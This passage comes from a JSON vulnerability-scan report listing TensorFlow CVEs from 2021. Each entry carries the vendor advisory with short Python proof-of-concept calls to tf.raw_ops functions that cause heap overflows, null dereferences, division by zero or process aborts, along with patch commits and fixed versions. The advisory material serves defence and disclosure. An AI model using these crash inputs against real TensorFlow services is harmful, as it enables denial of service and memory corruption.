                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29560",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29560"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29560",
              "help": {
                "text": "Vulnerability CVE-2021-29560\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29560](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29560)\n### Impact\nAn attacker can cause a heap buffer overflow in `tf.raw_ops.RaggedTensorToTensor`:\n\n```python\nimport tensorflow as tf\n\nshape = tf.constant([10, 10], shape=[2], dtype=tf.int64)\nvalues = tf.constant(0, shape=[1], dtype=tf.int64)\ndefault_value = tf.constant(0, dtype=tf.int64)\nl = [849, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]\nrow = tf.constant(l, shape=[5, 43], dtype=tf.int64)\nrows = [row]\ntypes = [`ROW_SPLITS`]\n\ntf.raw_ops.RaggedTensorToTensor(\n    shape=shape, values=values, default_value=default_value,\n    row_partition_tensors=rows, row_partition_types=types) \n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/d94227d43aa125ad8b54115c03cece54f6a1977b/tensorflow/core/kernels/ragged_tensor_to_tensor_op.cc#L219-L222) uses the same index to access two arrays in parallel:\n\n```cc\nfor (INDEX_TYPE i = 0; i \u003c row_split_size - 1; ++i) {\n  INDEX_TYPE row_length = row_split(i + 1) - row_split(i);\n  INDEX_TYPE real_length = std::min(output_size, row_length);\n  INDEX_TYPE parent_output_index_current = parent_output_index[i];\n  ...\n}\n```\n\nSince the user controls the shape of the input arguments, an attacker could trigger a heap OOB access when `parent_output_index` is shorter than `row_split`.\n\n### Patches\nWe have patched the issue in GitHub commit [a84358aa12f0b1518e606095ab9cfddbf597c121](https://github.com/tensorflow/tensorflow/commit/a84358aa12f0b1518e606095ab9cfddbf597c121).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29560**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29560](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29560)|\n\n### Impact\nAn attacker can cause a heap buffer overflow in `tf.raw_ops.RaggedTensorToTensor`:\n\n```python\nimport tensorflow as tf\n\nshape = tf.constant([10, 10], shape=[2], dtype=tf.int64)\nvalues = tf.constant(0, shape=[1], dtype=tf.int64)\ndefault_value = tf.constant(0, dtype=tf.int64)\nl = [849, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]\nrow = tf.constant(l, shape=[5, 43], dtype=tf.int64)\nrows = [row]\ntypes = [`ROW_SPLITS`]\n\ntf.raw_ops.RaggedTensorToTensor(\n    shape=shape, values=values, default_value=default_value,\n    row_partition_tensors=rows, row_partition_types=types) \n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/d94227d43aa125ad8b54115c03cece54f6a1977b/tensorflow/core/kernels/ragged_tensor_to_tensor_op.cc#L219-L222) uses the same index to access two arrays in parallel:\n\n```cc\nfor (INDEX_TYPE i = 0; i \u003c row_split_size - 1; ++i) {\n  INDEX_TYPE row_length = row_split(i + 1) - row_split(i);\n  INDEX_TYPE real_length = std::min(output_size, row_length);\n  INDEX_TYPE parent_output_index_current = parent_output_index[i];\n  ...\n}\n```\n\nSince the user controls the shape of the input arguments, an attacker could trigger a heap OOB access when `parent_output_index` is shorter than `row_split`.\n\n### Patches\nWe have patched the issue in GitHub commit [a84358aa12f0b1518e606095ab9cfddbf597c121](https://github.com/tensorflow/tensorflow/commit/a84358aa12f0b1518e606095ab9cfddbf597c121).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29580",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29580"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29580",
              "help": {
                "text": "Vulnerability CVE-2021-29580\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29580](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29580)\n### Impact\nThe implementation of `tf.raw_ops.FractionalMaxPoolGrad` triggers an undefined behavior if one of the input tensors is empty:\n\n```python\nimport tensorflow as tf\n\norig_input = tf.constant([2, 3], shape=[1, 1, 1, 2], dtype=tf.int64)\norig_output = tf.constant([], dtype=tf.int64) \nout_backprop = tf.zeros([2, 3, 6, 6], dtype=tf.int64)\nrow_pooling_sequence = tf.constant([0], shape=[1], dtype=tf.int64)\ncol_pooling_sequence = tf.constant([0], shape=[1], dtype=tf.int64)\n\ntf.raw_ops.FractionalMaxPoolGrad(\n  orig_input=orig_input, orig_output=orig_output, out_backprop=out_backprop,\n  row_pooling_sequence=row_pooling_sequence,\n  col_pooling_sequence=col_pooling_sequence, overlapping=False)\n```\n\nThe code is also vulnerable to a denial of service attack as a `CHECK` condition becomes false and aborts the process\n\n```python\nimport tensorflow as tf\n\norig_input = tf.constant([1], shape=[1], dtype=tf.int64)\norig_output = tf.constant([1], shape=[1], dtype=tf.int64)\nout_backprop = tf.constant([1, 1], shape=[2, 1, 1, 1], dtype=tf.int64)\nrow_pooling_sequence = tf.constant([1], shape=[1], dtype=tf.int64) \ncol_pooling_sequence = tf.constant([1], shape=[1], dtype=tf.int64)\n\ntf.raw_ops.FractionalMaxPoolGrad(\n  orig_input=orig_input, orig_output=orig_output, out_backprop=out_backprop,\n  row_pooling_sequence=row_pooling_sequence,\n  col_pooling_sequence=col_pooling_sequence, overlapping=False)\n``` \n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/169054888d50ce488dfde9ca55d91d6325efbd5b/tensorflow/core/kernels/fractional_max_pool_op.cc#L215) fails to validate that input and output tensors are not empty and are of the same rank. Each of these unchecked assumptions is responsible for the above issues.\n\n### Patches\nWe have patched the issue in GitHub commit [32fdcbff9d06d010d908fcc4bd4b36eb3ce15925](https://github.com/tensorflow/tensorflow/commit/32fdcbff9d06d010d908fcc4bd4b36eb3ce15925).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29580**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29580](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29580)|\n\n### Impact\nThe implementation of `tf.raw_ops.FractionalMaxPoolGrad` triggers an undefined behavior if one of the input tensors is empty:\n\n```python\nimport tensorflow as tf\n\norig_input = tf.constant([2, 3], shape=[1, 1, 1, 2], dtype=tf.int64)\norig_output = tf.constant([], dtype=tf.int64) \nout_backprop = tf.zeros([2, 3, 6, 6], dtype=tf.int64)\nrow_pooling_sequence = tf.constant([0], shape=[1], dtype=tf.int64)\ncol_pooling_sequence = tf.constant([0], shape=[1], dtype=tf.int64)\n\ntf.raw_ops.FractionalMaxPoolGrad(\n  orig_input=orig_input, orig_output=orig_output, out_backprop=out_backprop,\n  row_pooling_sequence=row_pooling_sequence,\n  col_pooling_sequence=col_pooling_sequence, overlapping=False)\n```\n\nThe code is also vulnerable to a denial of service attack as a `CHECK` condition becomes false and aborts the process\n\n```python\nimport tensorflow as tf\n\norig_input = tf.constant([1], shape=[1], dtype=tf.int64)\norig_output = tf.constant([1], shape=[1], dtype=tf.int64)\nout_backprop = tf.constant([1, 1], shape=[2, 1, 1, 1], dtype=tf.int64)\nrow_pooling_sequence = tf.constant([1], shape=[1], dtype=tf.int64) \ncol_pooling_sequence = tf.constant([1], shape=[1], dtype=tf.int64)\n\ntf.raw_ops.FractionalMaxPoolGrad(\n  orig_input=orig_input, orig_output=orig_output, out_backprop=out_backprop,\n  row_pooling_sequence=row_pooling_sequence,\n  col_pooling_sequence=col_pooling_sequence, overlapping=False)\n``` \n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/169054888d50ce488dfde9ca55d91d6325efbd5b/tensorflow/core/kernels/fractional_max_pool_op.cc#L215) fails to validate that input and output tensors are not empty and are of the same rank. Each of these unchecked assumptions is responsible for the above issues.\n\n### Patches\nWe have patched the issue in GitHub commit [32fdcbff9d06d010d908fcc4bd4b36eb3ce15925](https://github.com/tensorflow/tensorflow/commit/32fdcbff9d06d010d908fcc4bd4b36eb3ce15925).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29538",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29538"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29538",
              "help": {
                "text": "Vulnerability CVE-2021-29538\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29538](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29538)\n### Impact\nAn attacker can cause a division by zero to occur in `Conv2DBackpropFilter`:\n\n```python\nimport tensorflow as tf\n\ninput_tensor = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32)\nfilter_sizes = tf.constant([0, 0, 0, 0], shape=[4], dtype=tf.int32)\nout_backprop = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32)\n\ntf.raw_ops.Conv2DBackpropFilter(\n  input=input_tensor,\n  filter_sizes=filter_sizes,\n  out_backprop=out_backprop,\n  strides=[1, 1, 1, 1],\n  use_cudnn_on_gpu=False,\n  padding=`SAME`,\n  explicit_paddings=[],\n  data_format=`NHWC`,\n  dilations=[1, 1, 1, 1]\n)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/1b0296c3b8dd9bd948f924aa8cd62f87dbb7c3da/tensorflow/core/kernels/conv_grad_filter_ops.cc#L513-L522) computes a divisor based on user provided data (i.e., the shape of the tensors given as arguments):\n\n```cc\nconst size_t size_A = output_image_size * filter_total_size; \nconst size_t size_B = output_image_size * dims.out_depth;\nconst size_t size_C = filter_total_size * dims.out_depth;\nconst size_t work_unit_size = size_A + size_B + size_C;\nconst size_t shard_size = (target_working_set_size + work_unit_size - 1) / work_unit_size;\n```\n\nIf all shapes are empty then `work_unit_size` is 0. Since there is no check for this case before division, this results in a runtime exception, with potential to be abused for a denial of service. \n\n### Patches\nWe have patched the issue in GitHub commit [c570e2ecfc822941335ad48f6e10df4e21f11c96](https://github.com/tensorflow/tensorflow/commit/c570e2ecfc822941335ad48f6e10df4e21f11c96).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n  \n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29538**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29538](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29538)|\n\n### Impact\nAn attacker can cause a division by zero to occur in `Conv2DBackpropFilter`:\n\n```python\nimport tensorflow as tf\n\ninput_tensor = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32)\nfilter_sizes = tf.constant([0, 0, 0, 0], shape=[4], dtype=tf.int32)\nout_backprop = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32)\n\ntf.raw_ops.Conv2DBackpropFilter(\n  input=input_tensor,\n  filter_sizes=filter_sizes,\n  out_backprop=out_backprop,\n  strides=[1, 1, 1, 1],\n  use_cudnn_on_gpu=False,\n  padding=`SAME`,\n  explicit_paddings=[],\n  data_format=`NHWC`,\n  dilations=[1, 1, 1, 1]\n)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/1b0296c3b8dd9bd948f924aa8cd62f87dbb7c3da/tensorflow/core/kernels/conv_grad_filter_ops.cc#L513-L522) computes a divisor based on user provided data (i.e., the shape of the tensors given as arguments):\n\n```cc\nconst size_t size_A = output_image_size * filter_total_size; \nconst size_t size_B = output_image_size * dims.out_depth;\nconst size_t size_C = filter_total_size * dims.out_depth;\nconst size_t work_unit_size = size_A + size_B + size_C;\nconst size_t shard_size = (target_working_set_size + work_unit_size - 1) / work_unit_size;\n```\n\nIf all shapes are empty then `work_unit_size` is 0. Since there is no check for this case before division, this results in a runtime exception, with potential to be abused for a denial of service. \n\n### Patches\nWe have patched the issue in GitHub commit [c570e2ecfc822941335ad48f6e10df4e21f11c96](https://github.com/tensorflow/tensorflow/commit/c570e2ecfc822941335ad48f6e10df4e21f11c96).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n  \n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29572",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29572"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29572",
              "help": {
                "text": "Vulnerability CVE-2021-29572\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29572](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29572)\n### Impact\nThe implementation of `tf.raw_ops.SdcaOptimizer` triggers undefined behavior due to dereferencing a null pointer:\n\n```python\nimport tensorflow as tf\n\nsparse_example_indices = [tf.constant((0), dtype=tf.int64), tf.constant((0), dtype=tf.int64)]\nsparse_feature_indices = [tf.constant([], shape=[0, 0, 0, 0], dtype=tf.int64), tf.constant((0), dtype=tf.int64)]\nsparse_feature_values = []\n\ndense_features = []\ndense_weights = []\n\nexample_weights = tf.constant((0.0), dtype=tf.float32)\nexample_labels = tf.constant((0.0), dtype=tf.float32)\n\nsparse_indices = [tf.constant((0), dtype=tf.int64), tf.constant((0), dtype=tf.int64)]\nsparse_weights = [tf.constant((0.0), dtype=tf.float32), tf.constant((0.0), dtype=tf.float32)]\n  \nexample_state_data = tf.constant([0.0, 0.0, 0.0, 0.0], shape=[1, 4], dtype=tf.float32)\n  \ntf.raw_ops.SdcaOptimizer(\n  sparse_example_indices=sparse_example_indices,\n  sparse_feature_indices=sparse_feature_indices,\n  sparse_feature_values=sparse_feature_values, dense_features=dense_features,\n  example_weights=example_weights, example_labels=example_labels, \n  sparse_indices=sparse_indices, sparse_weights=sparse_weights, \n  dense_weights=dense_weights, example_state_data=example_state_data,\n  loss_type=\"logistic_loss\", l1=0.0, l2=0.0, num_loss_partitions=1,\n  num_inner_iterations=1, adaptative=False)\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/60a45c8b6192a4699f2e2709a2645a751d435cc3/tensorflow/core/kernels/sdca_internal.cc) does not validate that the user supplied arguments satisfy all [constraints expected by the op](https://www.tensorflow.org/api_docs/python/tf/raw_ops/SdcaOptimizer).\n\n### Patches\nWe have patched the issue in GitHub commit [f7cc8755ac6683131fdfa7a8a121f9d7a9dec6fb](https://github.com/tensorflow/tensorflow/commit/f7cc8755ac6683131fdfa7a8a121f9d7a9dec6fb).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29572**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29572](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29572)|\n\n### Impact\nThe implementation of `tf.raw_ops.SdcaOptimizer` triggers undefined behavior due to dereferencing a null pointer:\n\n```python\nimport tensorflow as tf\n\nsparse_example_indices = [tf.constant((0), dtype=tf.int64), tf.constant((0), dtype=tf.int64)]\nsparse_feature_indices = [tf.constant([], shape=[0, 0, 0, 0], dtype=tf.int64), tf.constant((0), dtype=tf.int64)]\nsparse_feature_values = []\n\ndense_features = []\ndense_weights = []\n\nexample_weights = tf.constant((0.0), dtype=tf.float32)\nexample_labels = tf.constant((0.0), dtype=tf.float32)\n\nsparse_indices = [tf.constant((0), dtype=tf.int64), tf.constant((0), dtype=tf.int64)]\nsparse_weights = [tf.constant((0.0), dtype=tf.float32), tf.constant((0.0), dtype=tf.float32)]\n  \nexample_state_data = tf.constant([0.0, 0.0, 0.0, 0.0], shape=[1, 4], dtype=tf.float32)\n  \ntf.raw_ops.SdcaOptimizer(\n  sparse_example_indices=sparse_example_indices,\n  sparse_feature_indices=sparse_feature_indices,\n  sparse_feature_values=sparse_feature_values, dense_features=dense_features,\n  example_weights=example_weights, example_labels=example_labels, \n  sparse_indices=sparse_indices, sparse_weights=sparse_weights, \n  dense_weights=dense_weights, example_state_data=example_state_data,\n  loss_type=\"logistic_loss\", l1=0.0, l2=0.0, num_loss_partitions=1,\n  num_inner_iterations=1, adaptative=False)\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/60a45c8b6192a4699f2e2709a2645a751d435cc3/tensorflow/core/kernels/sdca_internal.cc) does not validate that the user supplied arguments satisfy all [constraints expected by the op](https://www.tensorflow.org/api_docs/python/tf/raw_ops/SdcaOptimizer).\n\n### Patches\nWe have patched the issue in GitHub commit [f7cc8755ac6683131fdfa7a8a121f9d7a9dec6fb](https://github.com/tensorflow/tensorflow/commit/f7cc8755ac6683131fdfa7a8a121f9d7a9dec6fb).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29573",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29573"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29573",
              "help": {
                "text": "Vulnerability CVE-2021-29573\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29573](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29573)\n### Impact\nThe implementation of `tf.raw_ops.MaxPoolGradWithArgmax` is vulnerable to a division by 0:\n\n```python\nimport tensorflow as tf\n\ninput = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32)\ngrad = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32)\nargmax = tf.constant([], shape=[0], dtype=tf.int64)\nksize = [1, 1, 1, 1]\nstrides = [1, 1, 1, 1]\n\ntf.raw_ops.MaxPoolGradWithArgmax(\n  input=input, grad=grad, argmax=argmax, ksize=ksize, strides=strides,\n  padding=`SAME`, include_batch_in_index=False)\n```\n  \nThe [implementation](https://github.com/tensorflow/tensorflow/blob/279bab6efa22752a2827621b7edb56a730233bd8/tensorflow/core/kernels/maxpooling_op.cc#L1033-L1034) fails to validate that the batch dimension of the tensor is non-zero, before dividing by this quantity.\n\n### Patches\nWe have patched the issue in GitHub commit [376c352a37ce5a68b721406dc7e77ac4b6cf483d](https://github.com/tensorflow/tensorflow/commit/376c352a37ce5a68b721406dc7e77ac4b6cf483d).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29573**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29573](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29573)|\n\n### Impact\nThe implementation of `tf.raw_ops.MaxPoolGradWithArgmax` is vulnerable to a division by 0:\n\n```python\nimport tensorflow as tf\n\ninput = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32)\ngrad = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32)\nargmax = tf.constant([], shape=[0], dtype=tf.int64)\nksize = [1, 1, 1, 1]\nstrides = [1, 1, 1, 1]\n\ntf.raw_ops.MaxPoolGradWithArgmax(\n  input=input, grad=grad, argmax=argmax, ksize=ksize, strides=strides,\n  padding=`SAME`, include_batch_in_index=False)\n```\n  \nThe [implementation](https://github.com/tensorflow/tensorflow/blob/279bab6efa22752a2827621b7edb56a730233bd8/tensorflow/core/kernels/maxpooling_op.cc#L1033-L1034) fails to validate that the batch dimension of the tensor is non-zero, before dividing by this quantity.\n\n### Patches\nWe have patched the issue in GitHub commit [376c352a37ce5a68b721406dc7e77ac4b6cf483d](https://github.com/tensorflow/tensorflow/commit/376c352a37ce5a68b721406dc7e77ac4b6cf483d).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29577",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29577"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29577",
              "help": {
                "text": "Vulnerability CVE-2021-29577\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29577](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29577)\n### Impact\nThe implementation of `tf.raw_ops.AvgPool3DGrad` is vulnerable to a heap buffer overflow:\n\n```python\nimport tensorflow as tf\n\norig_input_shape = tf.constant([10, 6, 3, 7, 7], shape=[5], dtype=tf.int32)\ngrad = tf.constant([0.01, 0, 0], shape=[3, 1, 1, 1, 1], dtype=tf.float32)\nksize = [1, 1, 1, 1, 1]\nstrides = [1, 1, 1, 1, 1]\npadding = \"SAME\"\n\ntf.raw_ops.AvgPool3DGrad(\n  orig_input_shape=orig_input_shape, grad=grad, ksize=ksize, strides=strides,\n  padding=padding)\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/d80ffba9702dc19d1fac74fc4b766b3fa1ee976b/tensorflow/core/kernels/pooling_ops_3d.cc#L376-L450) assumes that the `orig_input_shape` and `grad` tensors have similar first and last dimensions but does not check that this assumption is validated.\n\n### Patches\nWe have patched the issue in GitHub commit [6fc9141f42f6a72180ecd24021c3e6b36165fe0d](https://github.com/tensorflow/tensorflow/commit/6fc9141f42f6a72180ecd24021c3e6b36165fe0d).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",
